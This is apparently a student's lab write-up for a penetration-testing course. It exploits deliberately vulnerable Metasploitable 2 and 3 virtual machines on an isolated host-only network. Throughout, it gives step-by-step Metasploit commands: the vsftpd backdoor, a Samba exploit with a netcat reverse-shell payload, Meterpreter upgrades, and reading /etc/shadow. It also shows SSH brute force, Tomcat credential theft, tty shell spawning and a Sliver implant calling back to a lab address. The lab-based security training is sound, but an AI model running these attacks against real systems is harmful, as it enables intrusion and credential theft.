X) Read/Watch/Listen and Summarize:
(In this subsection X, there is no need to perform tests on the computer; reading or listening and a brief summary are enough. A few bullet points will suffice.)

Jaswal 2020: Mastering Metasploit - 4th ed.: Chapter 1: Approaching a Penetration Test Using Metasploit (from "Conducting a penetration test with Metasploit" to the end of the chapter, "Summary").
A) Practice in a Virtual Network
Set up a private virtual network with Kali and Metasploitable. Verify through tests that 1) the machines cannot connect to the internet and 2) the machines can communicate with each other. (No need to report on machine and network setup unless issues arise.)

B) Launch msfconsole in Metasploit
C) Locate Metasploitable via Port Scanning
Use db_nmap -sn for scanning. Confirm the IP by checking that the homepage of Metasploitable’s web server says "Metasploitable."

D) Perform a Thorough Port Scan of Metasploitable
Save results to Metasploit's databases (db_nmap) and files (nmap -oA foo).

E) Examine Metasploit’s Database
Use commands like "hosts" and "services" to view stored information. Experiment with filtering or searching these lists.

F) Compare File and Database Storage in nmap
Contrast nmap's file storage with db_nmap’s database storage in Metasploit. What are the advantages of each?

G) Exploit vsftpd on Metasploitable
H) Upgrade the Session to Meterpreter
I) Gather Lateral Movement Information
Collect data needed for lateral movement from Metasploitable, analyze it, and explain potential uses.

J) Exploit Metasploitable Using Another Method
(If difficult, consult online walkthroughs, and note how much assistance was needed.)

K) Demonstrate Meterpreter Features
L) Log the Shell Session Using the Script Tool
Use script -fa log001.txt to save the session.

M) Optional: Get a tty Shell on Metasploitable
Try to open a full tty shell in Metasploitable (e.g., open nano in full screen).

N) Optional, Advanced: Use a Competing Tool
Try a different attack or remote access tool, like Sliver.

O) Optional, Advanced: Install and Exploit Metasploitable 3
Reference: Karvinen 2018 - Install Metasploitable 3 – Vulnerable Target Computer.

### 📝 X) Read and Summarize Task

https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31

- Pentesting is attacking a network or system with intention to find vulnerabilities.
- Helps organizations understand flaws and keep up with securing their systems.
- Good pentesting requires good tools and techniques


<a name="chapter-summary-mastering-metasploit"></a>
#### 📖 Chapter Summary: Mastering Metasploit

<a name="a-practice-in-virtual-network"></a>
## 🔓 A) Setup Virtual Network

Previously completed in class on laptop, but lets repeat the process at home on desktop, one of the most important steps before starting the pentests is to secure the environment to not accidentally attack outside of our network.

Kali VM with 2 NIC:s(NAT + Host only adapter)
Metasploitable 2 VM with 1NIC(Host-only adapter)

Kali has access to internet, lets shut it down.
![](imagesh2/imagesh2/image.png)

Then i run the following command to see if metasploitable is up and reachable:
```nmap -sn 192.168.56.0/24 ```

seems to be up on 192.168.56.101 lets continue with next task.

<a name="b-launch-msfconsole-in-metasploit"></a>
## 🚀 B) Launch msfconsole in Metasploit

```sudo msfconsole```

![alt text](imagesh2/image-1.png)


<a name="c-locate-metasploitable-via-port-scanning"></a>
## 📡 C) Locate Metasploitable via Port Scanning

inside msfconsole we run the command ```db_nmap -sV 192.168.56.101```

![](imagesh2/image-2.png)

It seems our db is not up, lets close msfconsole and start postgresql
```sudo systemctl start postgresql.service```

![alt text](imagesh2/image-3.png)

after this we restart msfconsole and now the nmap is working

```db_nmap -sn 192.168.56.0/24```

![alt text](imagesh2/image-5.png)


<a name="d-perform-a-thorough-port-scan-of-metasploitable"></a>
## 🔍 D) Perform a Thorough Port Scan of Metasploitable

we first run ```db_nmap -A 192.168.56.101``` 

we are getting lots of data about the target and its services

![alt text](imagesh2/image-6.png)

<a name="e-examine-metasploits-database"></a>
## 📊 E) Examine Metasploit’s Database

```hosts``` and ```servces``` commands give a good overview of the network

![alt text](imagesh2/image-7.png)

We can further filter the database info, for example

```
services - 80
```
Is showing us all hosts with a service on port 80
![alt text](imagesh2/imageService.png)

We can also choose what columns are shown and create a custom list

```hosts -c address,os_flavour,os_name,purpose ```

with ```-o``` these could be output to a file


![alt text](imagesh2/image-8.png)

<a name="f-compare-file-and-database-storage"></a>
## 📄 F) Compare File and Database Storage

Example ```nmap -sV -oN scan.txt 192.168.56.101```
gives us a pretty clean text file of services on the target 

![alt text](imagesh2/image-9.png)

But the db_nmap database actually gives us some more data, and also updating lists when doing new scans, has easier filtering options and as default the services command for msfdb gives us additional data about the services that updates when we run exploits and further scans. Also saves history data.

![alt text](imagesh2/image-10.png)



<a name="g-exploit-vsftpd-on-metasploitable"></a>
## 🔓 G) Exploit vsftpd on Metasploitable

First I use the search command inside msfconsole for vsftpd 2.3.4 to find usable exploits.

```search vsftpd 2.3.4```

![alt text](imagesh2/image-11.png)

found a possible exploit with "excellent" rank, lets try it

```use 0``` runs the exploit we just searched, alternatively we can use the "use" command to select our exploit ```use exploit/unix/ftp/vsftpd_234_backdoor```

then we have to select our target with set rhosts
```set rhosts 192.168.56.101```

then we run the exploit with ```exploit``` or ```run```

![alt text](imagesh2/image-12.png)

This time it did not automatically open session but with ```sessions``` command we can see that its connected.

![alt text](imagesh2/image-13.png)

then ```sessions 1``` activates the session, after connection i test it with ```whoami``` command

![alt text](imagesh2/image-14.png)


<a name="h-upgrade-the-session-to-meterpreter"></a>
## 📈 H) Upgrade the Session to Meterpreter

we drop our session to background with ```ctrl+z``` 
then upgrade to meterpreter with ```sessions -u 1```

now we can list our ```sessions``` and open the meterpreter session
```sessions 2```

![alt text](imagesh2/image-15.png)

<a name="i-gather-lateral-movement-information"></a>
## 🔍 I) Gather Lateral Movement Information

Lets see what we are working with, starting with ```sysinfo``` and ```getuid```

![alt text](imagesh2/image-16.png)

we can tell we are inside a linux system as root

lets gather some user and password data, this could be further used to crack the passwords.

```cat /etc/passwd/```

![alt text](imagesh2/image-17.png)

example:
```cat /etc/shadow/```

![alt text](imagesh2/image-18.png)

we could also search for other private or important data like ssh keys:

![alt text](imagesh2/image-19.png)

<a name="j-exploit-using-another-method"></a>
## 🔨 J) Exploit Using Another Method

Lets back out from meterpreter with exit, then unload the exploit with back. Now listing services again, lets try ssh brute-force login with root and rockyou.txt

![alt text](imagesh2/image-20.png)

basic configuration done, then lets run

![alt text](imagesh2/image-21.png)

This seems extremely slow, i decide to stop and try something different.

Listing services again:

![alt text](imagesh2/image-22.png)

This time i choose samba, first i search for possible exploits with

```search samba 3.0```

![alt text](imagesh2/image-23.png)

i load up the first one with ```use 0``` it has excellent rank but its old, lets give it a try. Im using the default payload ***cmd/unix/reverse_netcat***

![alt text](imagesh2/image-24.png)

Exploit should work, but i forgot to setup **LHOST** and **LPORT**

![alt text](imagesh2/image-25.png)

**Success**, this exploit works aswell.


<a name="k-demonstrate-meterpreter-features"></a>
## ⚙️ K) Demonstrate Meterpreter Features

I start with listing sessions then upgrading our new session to meterpreter with ```sessions -u 3```

After the session finishes upgrading to meterpreter, i open the session

![alt text](imagesh2/image-27.png)

meterpreter is a handy tool with built in functions to exploit and run commands or load scripts to a target system, with help command we get a list of:

- core commands
- file system commands
- networking commands
- system commands
- webcam commands
- mic commands
- audio output commands

Im intrested in the extensions and modules, so a quick google search lands me to a [medium article](https://medium.com/@rob.mccarthy31/meterpreter-tips-tricks-17877dda10fa) giving some advice, it includes a "hot tip" of using a post module exploit suggester:

```run post/multi/recon/local_exploit_suggester```

![alt text](imagesh2/image-29.png)
Seems useful

Lets browse other post/multi modules

![alt text](imagesh2/image-30.png)

I try to look for something useful, remembering this target had tomcat live on http://192.168.56.101:8180/ so lets run the tomcat gather module

![alt text](imagesh2/image-31.png)

user + password found, tomcat:tomcat

![alt text](imagesh2/image-32.png)

Login works

![alt text](imagesh2/image-33.png)

<a name="l-log-the-shell-session-with-script"></a>
## 📝 L) Log the Shell Session with Script

```script -fa logfile.txt``` starts recording the shell window to a log file live, to back out we type exit, here is result of the log file:

![alt text](imagesh2/image-34.png)

<a name="m-optional-get-a-tty-shell-on-metasploitable"></a>
## 💻 M) Optional: Get a tty Shell on Metasploitable

No clue how to solve this, [asking chatgpt ](imagesh2/image-35.png)

with session active, first going to shell then,

```python -c 'import pty; pty.spawn("/bin/bash")'```

spawning tty shell with python and running 

```export TERM=xterm```


![alt text](imagesh2/image-36.png)

![](imagesh2/image-37.png)

Seems to work!


<a name="n-optional-advanced-use-a-competing-tool"></a>
## 🛠️ N) Optional, Advanced: Try another attack tool or hostile remote access tool, such as Sliver.

installing sliver:
```
sudo apt-get install sliver 
```
running sliver:
```
sudo sliver-server
```
next we need to compile payload for the victim:
```
generate --os linux --arch x86 --format elf --mtls 192.168.56.104:443
```

![alt text](imagesh2/image-38.png)

running mtls listener on port 443 with

```
mtls -l 443
```
and confirm its running with ```jobs``` command
![](imagesh2/image-39.png)

Generated payloads, uploaded and executed them with meterpreter, but it just would not connect to my server. Decided to move on to next task and solve this later if i have the time.

![alt text](imagesh2/image-40.png)


<a name="o-optional-advanced-install-and-exploit-metasploitable-3"></a>
## 🖥️ O) Optional, Advanced: Install and Exploit Metasploitable 3

Downloaded metasploit3 ubuntu version with vagrant as per guide here (https://portal.cloud.hashicorp.com/vagrant/discover/noordev/metasploitable3)

After awhile its downloaded, i setup network same was as on metasploit2, host only adapter and start it

![alt text](imagesh2/image-41.png)

back to my kali vm, i can see theres a new ip address, 192.168.56.105

![](imagesh2/image-42.png)

running the db_nmap -A and then filter services to show me the new target to see what we have to play with

![alt text](imagesh2/image-43.png)

Seems to have some intresting stuff, I first try searching ProFTPD with metasploit search

```
search ProFTPD 1.3.5
use 0
set RHOSTS 192.168.56.105
set LHOST 192.168.56.104
run
```


![alt text](imagesh2/image-44.png)

Cant get through, says directory maybe not writeable? 


I decide to move on and try something else

I try similiar approach with the Jetty service, but no luck

![alt text](imagesh2/image-45.png)

After browsing the target http website i came accross some panel hosted on port 8080 and named continuum, i try to access with some basic sql injections, no luck.

![alt text](imagesh2/image-47.png)

I try searching continuum on the metasploit database

![alt text](imagesh2/image-48.png)

Found an exploit, lets try it

![alt text](imagesh2/image-49.png)

And **im in** with meterpreter. after that spent some time roaming around the files, tried some meterpreter modules like 
``` run post/linux/gather/enum_configs ```
and others similiar to this also gathering "loot"
